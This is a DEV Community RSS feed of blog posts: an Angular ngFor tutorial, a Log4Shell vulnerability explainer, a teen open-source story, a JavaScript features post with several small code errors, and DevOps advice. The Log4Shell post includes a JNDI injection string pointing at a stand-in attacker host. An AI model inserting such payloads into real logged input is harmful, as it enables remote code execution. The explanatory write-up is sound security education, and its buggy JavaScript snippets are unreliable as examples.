<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Understanding Built In Angular Directives - Part 5</title>
      <author>Anubhab Mukherjee</author>
      <pubDate>Fri, 24 Dec 2021 19:40:23 +0000</pubDate>
      <link>https://dev.to/anubhab5/understanding-built-in-angular-directives-part-5-gli</link>
      <guid>https://dev.to/anubhab5/understanding-built-in-angular-directives-part-5-gli</guid>
      <description>&lt;p&gt;&lt;strong&gt;T&lt;/strong&gt;oday we will cover another important structural directive provided by the Angular Team - &lt;code&gt;ngFor&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ngFor&lt;/code&gt;&lt;br&gt;
The ngFor directive is used to loop through an array of items in the template. The element where the directive is written becomes the parent which is repeated.&lt;/p&gt;

&lt;p&gt;Lets see that in practice-&lt;br&gt;
We need to update our &lt;em&gt;structural-directive-demo.component.ts&lt;/em&gt; file and add the below code -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;itemsToBuy = ['Pencil', 'Notebook', 'School bag', 'Eraser'];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and in component template file add the below code -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;div *ngFor="let item of itemsToBuy"&amp;gt;
  {{ item }}
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now if you start the application and open localhost:4200 in the browser you would see the below output -&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4yZ94l4K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lgn3bdgawv76ii3jint6.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4yZ94l4K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lgn3bdgawv76ii3jint6.PNG" alt="Image description" width="351" height="194"&gt;&lt;/a&gt;&lt;br&gt;
Now lets understand the below code&lt;br&gt;
&lt;code&gt;*ngFor="let item of itemsToBuy"&lt;/code&gt; &lt;br&gt;
Here ngFor is a structural directive so the * is appended at the start followed by the equals &lt;code&gt;=&lt;/code&gt; operator.&lt;br&gt;
Here &lt;code&gt;itemsToBuy&lt;/code&gt; is the array we declared in the component TS file. We use the for-of syntax to loop through the array. Every item in the array is assigned to the variable &lt;code&gt;item&lt;/code&gt; which is then printed in between div tag by using the &lt;code&gt;{{item}}&lt;/code&gt;. The loop is auto incremented and moves to the next item until all the items are printed.&lt;br&gt;
In the above example &lt;code&gt;item&lt;/code&gt; variable holds a string value.&lt;br&gt;
Similarly the array can also be a &lt;u&gt;list of objects&lt;/u&gt;. &lt;br&gt;
In that case at every iteration item would hold an object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A word of Caution&lt;/strong&gt;&lt;br&gt;
You should not use two structural directives on the same element.&lt;/p&gt;

&lt;p&gt;For example ngIf and ngFor at the same div element is not allowed.&lt;/p&gt;

&lt;p&gt;That's all about &lt;code&gt;ngFor&lt;/code&gt;. Hope you enjoyed the post.&lt;br&gt;
Please like, comment and share&lt;br&gt;
The last structural directive is on your way. So stay tuned.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cheers&lt;/strong&gt;!!!&lt;br&gt;
&lt;em&gt;Happy Coding&lt;/em&gt;&lt;/p&gt;

</description>
      <category>angular</category>
      <category>beginners</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Apache Log4j : Return of the JNDI</title>
      <author>Shubham Sah</author>
      <pubDate>Fri, 24 Dec 2021 19:28:52 +0000</pubDate>
      <link>https://dev.to/shubhamsah/apache-log4j-return-of-the-jndi-292o</link>
      <guid>https://dev.to/shubhamsah/apache-log4j-return-of-the-jndi-292o</guid>
      <description>&lt;p&gt;It seems surreal seeing log4j, a logging utility in the news and all over the internet. How is it that a little over &lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;35000&lt;/a&gt; java packages, amounting to 8% of the Maven Central Repository has been impacted due to the log4shell vulnerability. How is it that a vulnerability in a logging library could result in a &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"&gt;CVSS score&lt;/a&gt; of 10[the highest it can go is 10]. This classic java logging library hitting mainstream feels so odd. Two different worlds that shouldn't be meeting.&lt;/p&gt;

&lt;p&gt;In this blog, let's understand what is log4j and what exactly is this log4shell vulnerability and why it happened? &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--H8KmtozX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0hr3cazeqq8tatk0j8sr.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--H8KmtozX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0hr3cazeqq8tatk0j8sr.jpeg" alt="log4shell" width="700" height="760"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j"&gt;
  &lt;/a&gt;
  &lt;strong&gt;What is log4j?&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://github.com/apache/logging-log4j2"&gt;Apache Log4j&lt;/a&gt; is one of the most utilized logging library in the Java ecosystem. If you ever worked within a Java application, you've probably seen log4j in action. Log4j along with the basic logging capabilities, it provides additional logging capabilities like log levels, a mechanism to write to different files, log rolling patterns. Although logging in java is quite a hell, log4j has been doing its job pretty fine over the years. I wanted to introduce log4j and its basic features to understand the bigger picture. So here is a simple java example using log4j.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8MTfjpaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/th7a4qsj0m1qpwmuvgov.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8MTfjpaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/th7a4qsj0m1qpwmuvgov.png" alt="Log4j Example" width="880" height="584"&gt;&lt;/a&gt;&lt;br&gt;
In the above snippet, we are getting a logger instance &lt;code&gt;logger = LogManager.getLogger();&lt;/code&gt; and we are calling &lt;code&gt;logger.info("Hello World");&lt;/code&gt; to log a basic message. Besides this, log4j can be heavily configured. You can learn more on configuring log4j &lt;a href="https://logging.apache.org/log4j/2.x/manual/configuration.html"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j-vulnerability-aka-log4shell-"&gt;
  &lt;/a&gt;
  &lt;strong&gt;What is Log4j vulnerability aka Log4Shell? :&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Log4j by default supported a logging capability called lookups. Lookups in log4j are a way to add a value to the log4j configuration. This means it can interpolate specific strings at the time of logging the message. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2CpPDRSM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1a80i6ye8403f91n9d0l.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--2CpPDRSM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1a80i6ye8403f91n9d0l.png" alt="log4j.xml" width="880" height="384"&gt;&lt;/a&gt;&lt;br&gt;
For example the environment lookup &lt;code&gt;$${env:USER}&lt;/code&gt; allows us to add environment variables in the log message.&lt;br&gt;
One of the supported lookups in log4j is the JNDI Lookups which allows variables to be retrieved via JNDI which supports LDAP. To better understand how it can create a problem let's understand &lt;strong&gt;JNDI&lt;/strong&gt;&lt;br&gt;
JNDI as it stands for Java Naming and Directory Interface provides an API for applications to interact with remote objects which are registered with the RMI registry or directory services like LDAP. A java-based application can make use of JNDI and LDAP to retrieve a business object containing data it might need, a pretty cool feature. This LDAP server could be remote or local. As a result, if a string which would look like &lt;code&gt;${jndi:ldap://attackServer.com/Exploit}&lt;/code&gt; was to be ever logged, JNDI would make a remote request to the LDAP server 'attackServer.com', request the file Exploit from the webserver and execute the request, And BOOM you get a REMOTE CODE EXECUTION (RCE).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--akcOgH-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a2cm89yn2q6zu7bkhlyh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--akcOgH-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a2cm89yn2q6zu7bkhlyh.png" alt="Log4j attack cycle" width="700" height="388"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Log4j is such a popular library that even if you aren't using it directly, you might depend upon another library which actually uses log4j for their logging purpose or that might depend on another library that might use log4j. At this point, considering the popularity of log4j there is a good chance that any decent sized java application might be using Log4j. According to a dev-sec company called &lt;a href="https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/"&gt;Synk&lt;/a&gt; found that about 60% application they scanned uses log4j indirectly and not depending on it directly.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zMZgZvwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4mwe42s6gtnxzomhuwbs.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zMZgZvwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4mwe42s6gtnxzomhuwbs.png" alt="Synk Log4j scan" width="757" height="450"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-did-the-vulnerability-happen"&gt;
  &lt;/a&gt;
  &lt;strong&gt;How did the vulnerability happen?&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Now that we have a basic understanding of how the vulnerability works, the bigger question is how did this happen? &lt;br&gt;
You would be surprised that this exploit was sitting like a duck ready to be exploited for more than 8 years and no one noticed it. Let us understand the timeline.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;On 10th of December&lt;/a&gt;, Apache published an advisory for CVE 2021-44228 with an update for log4j. So unlike the internet's belief, it was not discovered in Minecraft. It was first reported by Chen Zhaojun from the Alibaba Cloud Security Team on 26th November 2021. The Apache log4j team was made aware of the bug on &lt;a href="https://github.com/apache/logging-log4j2/pull/608/commits"&gt;30th November 2021&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Rolling back to 2013, when a new feature patch was submitted to log4j to add log4j JNDI lookups, sounded like a cool feature. But this was the introduction of vulnerability. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-313"&gt;Reference here&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;In 2014, somebody wanted to disable date lookups because of the compatibility issues with other libraries and So a feature was asked to disable lookups. A new feature &lt;code&gt;%msg{nolookups}&lt;/code&gt; was added. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-905"&gt;Reference Here&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Fast forward to 2017, a new config option was added &lt;code&gt;formatmsgNoLookups&lt;/code&gt; which disables lookups globally. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-2109"&gt;Reference Here&lt;/a&gt; This now applies to &lt;code&gt;%msg{nolookups}&lt;/code&gt;, so you don't have to replace and configure all log messages with &lt;code&gt;%msg{nolookups}&lt;/code&gt; anymore. Both &lt;code&gt;%msg{nolookups}&lt;/code&gt; and &lt;code&gt;formatmsgNoLookups&lt;/code&gt; were proposed as the initial mitigation approach for the log4shell vulnerability for users who could not update their log4j dependency but was later scrapped. &lt;/li&gt;
&lt;li&gt;And in 2021 we finally get an advisory about the &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"&gt;RCE &lt;/a&gt;in the log4j utility tool. &lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;
  &lt;a href="#but-wait-a-minute-this-is-not-the-complete-timeline-there-is-a-significant-thing-that-is-missing"&gt;
  &lt;/a&gt;
  But wait a minute this is not the complete timeline, there is a significant thing that is missing
&lt;/h3&gt;

&lt;p&gt;In 2016, something important happened. Let's talk about the JNDI and the LDAP exploitation.&lt;br&gt;
In 2016, at BlackHat, there was a talk by &lt;a href="https://twitter.com/pwntester"&gt;Alvaro Muñoz&lt;/a&gt; named &lt;strong&gt;&lt;u&gt;A journey from JNDI/LDAP Manipulation to RCE DreamLand.&lt;/u&gt;&lt;/strong&gt; &lt;iframe width="710" height="399" src="https://www.youtube.com/embed/Y8a5nB-vy78"&gt;
&lt;/iframe&gt;
&lt;br&gt;
In this talk, they presented research into the JNDI and specifically the LDAP and RMI features. It turns out that you can basically "Store" java serialized objects in LDAP and then a JNDI lookup is not looking at just a basic string but maybe a complex java object. And this is where we enter the world of arbitrary code execution.&lt;br&gt;
In the java development world, people love to send complete objects over the network. And most of the Java Remote code execution CVEs are a result of arbitrary object deserialization or class. There is a java Security Manager object where you can set certain policies to prevent or sandbox arbitrary remote code execution. But yeah this whole object serialization and remote class loading is a java feature.&lt;/p&gt;

&lt;p&gt;And there we have a complete timeline of the log4shell vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mY00MdGI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aek77zrzktymrgkny197.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mY00MdGI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aek77zrzktymrgkny197.jpeg" alt="log4shell meme" width="574" height="499"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I think this thing shows that Pandora's box is now open, people are going to be looking at every open-source libraries, every closed source libraries to find similar things where this can come along.&lt;/p&gt;

&lt;p&gt;Thanks for reading this blog, if you find it valuable then give it an applaud 👏&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;https://logging.apache.org/log4j/2.x/security.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"&gt;https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"&gt;https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/"&gt;https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>java</category>
      <category>security</category>
      <category>log4shell</category>
      <category>log4j</category>
    </item>
    <item>
      <title>Aspiring 16 year old quant developer contributing to Open Source Application</title>
      <author>northern-64bit</author>
      <pubDate>Fri, 24 Dec 2021 19:26:40 +0000</pubDate>
      <link>https://dev.to/northern64bit/aspiring-16-year-old-quant-developer-contributing-to-open-source-application-16k4</link>
      <guid>https://dev.to/northern64bit/aspiring-16-year-old-quant-developer-contributing-to-open-source-application-16k4</guid>
      <description>&lt;p&gt;You may wonder who I am after reading the title. I’m a 16 year old who is in high school, with the dream of becoming a quant developer. This is my dream as I know this role comes with many flexible tasks, it uses math &amp;amp; finance which I find very interesting and where I can, apply my coding skills. &lt;/p&gt;

&lt;p&gt;I have been developing computer programs since I was 11 years old. The first programming language I learned was html if you even dare to call it one. Quickly after this, I learned JavaScript, Python and then C. Python is by far my favourite programming language, since it’s easy to use, clear and has many powerful libraries. &lt;/p&gt;

&lt;p&gt;I started to make my own programs and discovered that I could use Python libraries to speed up development. From this, I learned about open-source projects which helped me a lot as I was able to read code from more experienced developers which helped me learn solutions in my code and improved my coding skills. After a while, I thought it was time to publish my own open-source repository: A stocks discord bot, which is a bot version of one of my GitHub stock programs, to possibly help other developers and traders.&lt;/p&gt;

&lt;p&gt;Another thing that I’ve heard that’s very important is networking. So, I thought that it would be best to contribute to a project with a large community, high coding standard (to learn from it) and experienced contributors that are ready to help. If I stick to this, I thought, I may even get to get some valuable connections to industry professionals.&lt;/p&gt;

&lt;p&gt;In August 2021, I sent a message to the Gamestonk Terminal (GST) Discord after seeing their brilliant work and discovering it. At that time, I was working on my previously mentioned open-source Discord bot and was motivated to continue with it. However, I immediately changed my mind after seeing all the features of GST and their contributor’s work. &lt;/p&gt;

&lt;p&gt;The repository was nearly a match made in heaven, since it was scripted in python, has multiple pull requests merged every day, and maintains high code standard by experienced developers. In addition, it’s the best financial open-source project on GitHub (at least according to me). &lt;/p&gt;

&lt;p&gt;Based on my experience with Discord bots, I got the idea of implementing one specifically for GST. The more I thought about it, the better of an idea it was in my mind. The reasons were that the bot can be widely distributed to phones, since it’s so easy to use via the Discord chat and can even be used by non-tech savvy users, a bot makes it easier to get fresh and easily shareable data for your investment conversations.&lt;br&gt;
I knew that by adding the bot to GST, the project would grow and be better since more users would get to know it. So, I asked in the Discord server of the repository if I could help and possibly make a Discord bot to make it more widely distributed and usable on the phone.&lt;/p&gt;

&lt;p&gt;To my surprise the response was very positive and I started to develop it right away. In the beginning I was a bit lost, since I have never thought about code architecture (most of my other applications were a 1000+ lines in one huge file) and I got the responsibility of the whole project. These troubles got quickly fixed after some calls with the creator of GST, Didier R. Lopes, who really helped me; I learned lots about making a robust, structured and easily understandable application. &lt;/p&gt;

&lt;p&gt;From then on it was just adding feature after feature and improvements from many other GST contributors. This was the case until I had several difficult challenges. The first one was that we wanted to implement a menu like the terminal has – this was solved by adding reactions: 0,1,2,3,..9 to the message so the user could select the command through a reaction. The next challenge was when a menu had more than 10 commands – which I solved by implementing “pagination”, which is a sort of scrolling system via buttons formatting the message like a book. However, this resulted in an additional bug with the emoji detection system due to it being loop and the “pagination” being a loop too. Therefore, I started to experiment with multithreading of which I knew nothing about. But after some time, I managed to merge the code bits from the two loops together into one loop.&lt;/p&gt;

&lt;p&gt;Overall, the development process was exciting and a great learning experience that I wish every other young developer can have. My two cents are to make real useful code with simplicity and understandability in mind to improve your code, since it helps more than leetcode and super theoretical programs that never can be contributed to by other programmers.&lt;/p&gt;

&lt;p&gt;The hard part (or rather the time-consuming part) is to understand code from other people to the extent that you can contribute to it in a meaningful way, so I needed to learn to use many other libraries. This is not meant to discourage you, but to get real hands-on experience with the libraries. It’s also more meaningful to learn more new libraries and function if it has a purpose. &lt;/p&gt;

&lt;p&gt;The Discord bot has a multitude of functions from the terminal and is easy to set up &amp;amp; host so that it’s easy to use the terminal on any device and to share it with other people. It’s also awesome to use it to show the underlying data of your investing thesis quickly to your friends in your own Discord server.&lt;/p&gt;

&lt;p&gt;Here’s a link to it:&lt;br&gt;
&lt;a href="https://github.com/GamestonkTerminal/GamestonkTerminal/tree/main/discordbot"&gt;https://github.com/GamestonkTerminal/GamestonkTerminal/tree/main/discordbot&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Currently I’m looking forward to improving the bot and continue to work with the GST team. My long-term goal is to become a quant (quantitative analyst/researcher/developer), but there’s a long way there since I’m currently only in high school. Thus, I’m ready to contribute on other finance open-source applications at any time, so please contact me on GitHub: &lt;a href="https://github.com/northern-64bit"&gt;https://github.com/northern-64bit&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Merry Christmas! &lt;br&gt;
northern-64bit&lt;/p&gt;

</description>
      <category>opensource</category>
      <category>discord</category>
    </item>
    <item>
      <title>Latest Javascript Feature you should know </title>
      <author>Kamran Ahmad</author>
      <pubDate>Fri, 24 Dec 2021 18:15:59 +0000</pubDate>
      <link>https://dev.to/officialkamran/latest-javascript-feature-you-should-know-4657</link>
      <guid>https://dev.to/officialkamran/latest-javascript-feature-you-should-know-4657</guid>
      <description>&lt;h2&gt;
  &lt;a href="#numeric-separator"&gt;
  &lt;/a&gt;
  Numeric Separator
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Large Numeric Literals Are Difficult For The Human Eye To Parse Quickly.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The Numeric Separators Allow You To Add Underscores Between Digital In Literal Numeric, Which Makes Them More Readable.&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let value1 = 250000000;
let value2 = 250_000_000; //same as value1 i.e 250000000
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The Underscores will be stripped out automatically when the files get parsed.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#nullish-coalescing"&gt;
  &lt;/a&gt;
  Nullish Coalescing
&lt;/h1&gt;

&lt;p&gt;The Nullish Coalescing Operator(??) allow us to check nullish values instead of falsy values.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let count1 = 0;
let result1 = count1 ?? 1;
console.log(result1); //output - 0

let count2 = null;
let result2 = count2 ?? 1;
console.log(result2); // output - 1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nullish Coalescing Operator (??) is better choice than the logical OR operator (||) if you want to assign a default value to a variable.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#bigint"&gt;
  &lt;/a&gt;
  BigInt
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The maximum number you can store as an integer in JavaScript is 2^53-1&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;And BigInt allow you to go even beyond that, such that it provides a way to represent whole number larger than 2^53-1&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A BigInt is created by appending n to end of an Integer literal of by calling the function BigInt that creates BigInt form string, number et.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const Bigint = 123456789012345678901234567890123456789n;
const sameBigint = Bigint("123456789012345678901234567890n");
const BigintfronNumber = Bigint(10); //same as 10n
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#optional-chaining"&gt;
  &lt;/a&gt;
  Optional Chaining
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The Optional Chaining Operator allow you to access properties of potentially undefined/null values without throwing an exception.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;it allow you to access nested object property without worrying if the property exist or not.&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const user = {
          dog: {
          name: "chee"
         }
       };

console.log(user.monkey?.name); //undefined 
console.log(user.dog? .name); // chee

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#promiseany"&gt;
  &lt;/a&gt;
  Promise.any()
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Promise.any() takes an iterable of promise objects.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;it returns a single promise that resolves as soon as any of the promises in the iterable fulfill. with the value of the fulfilled promise.&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const promise1 = /*some*/;
const promise2 = /*some*/;
const promise3 = /*some*/;

const promises = [promise1, promise2, promise3];

promise.any(promises).then((value)=&amp;gt;console.log(value));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>javascript</category>
      <category>beginners</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>DevOps and SRE: 2022 Advice</title>
      <author>Mike Levan</author>
      <pubDate>Fri, 24 Dec 2021 18:02:54 +0000</pubDate>
      <link>https://dev.to/thenjdevopsguy/devops-and-sre-2022-advice-5dhp</link>
      <guid>https://dev.to/thenjdevopsguy/devops-and-sre-2022-advice-5dhp</guid>
      <description>&lt;p&gt;As we wrap up 2021 and head into 2022, it’s time to start thinking about where our focus should be from a technical perspective in 2022 to ensure we’re staying up to date and are constantly keeping ourselves ahead of the learning curve.&lt;/p&gt;

&lt;p&gt;2021 was an awesome year in tech and it opened our eyes up to a few key realities:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The cloud doesn’t always stay up&lt;/li&gt;
&lt;li&gt;Application Performance Monitoring (APM) is crucial for any app&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this blog post, you’re going to learn what to think about in 2022 via the DevOps and SRE space. Although this isn’t an exhaustive list, this should give you a good foundation. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#application-monitoring"&gt;
  &lt;/a&gt;
  Application Monitoring
&lt;/h2&gt;

&lt;p&gt;Application monitoring was always somewhat important, but definitely not as apparent as it is now. Way back when, a lot of engineers thought about how to monitor systems because that’s where the application was running. Now that there are other styles of systems like containers and serverless, it’s not really about the underlying infrastructure anymore, but instead about how the code is running.&lt;/p&gt;

&lt;p&gt;Testing if applications perform the way that you’re expecting and can handle the load from a user perspective can be broken down into two categories:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Application Performance Monitoring (APM)&lt;/li&gt;
&lt;li&gt;Load testing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Some popular APM tools are New Relic and Datadog. A few popular performance testing tools are Apache’s jMeter and Vegeta. Whichever you choose, ensure that it serves the purpose of monitoring the performance of an application and it gives you a way to test the performance.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#systems-monitoring"&gt;
  &lt;/a&gt;
  Systems Monitoring
&lt;/h2&gt;

&lt;p&gt;When it comes to systems monitoring, you have to think about systems in a different way than just virtual machines. Systems can now include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Containers&lt;/li&gt;
&lt;li&gt;Kubernetes&lt;/li&gt;
&lt;li&gt;Serverless&lt;/li&gt;
&lt;li&gt;Bare metal&lt;/li&gt;
&lt;li&gt;Virtual machines&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of those systems can host an application, which means it needs to be monitored properly.&lt;/p&gt;

&lt;p&gt;Containers need to be monitored to ensure the binary/app is running properly. Kubernetes needs to be monitored to ensure &lt;code&gt;etcd&lt;/code&gt;, the Kubernetes API, the control plane, and many other factors are working the way they should be. Serverless needs to be monitored to ensure the application is running as expected and is scaling the way it should be. Bare metal and virtual machines need to be monitored for not only the application, but for the RAM, CPU, and other physical components. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#scalability"&gt;
  &lt;/a&gt;
  Scalability
&lt;/h2&gt;

&lt;p&gt;Scaling comes in all shapes and sizes, but in recent years, it’s very cloud-focused. Although there are still many enterprises and organizations that have been around for a while running on-prem, most new startups are 100% in the cloud and existing organizations are starting to run several workloads in the cloud.&lt;/p&gt;

&lt;p&gt;However, that comes at a cost (in this case, non-financial).&lt;/p&gt;

&lt;p&gt;We all know about the three outages in AWS this month. The cloud isn’t the end all be all. We still require scalability across regions and availability zones, but like we do with on-prem workloads. If you take on-prem workloads and scale them across data centers, you need to do the same thing in the cloud.&lt;/p&gt;

&lt;p&gt;There’s a common misconception that if something is running in the cloud, the cloud provider will take care of it for you. That’s not the case. Data centers still go down and servers still crash. It’s up to the engineers to handle the scalability. &lt;/p&gt;

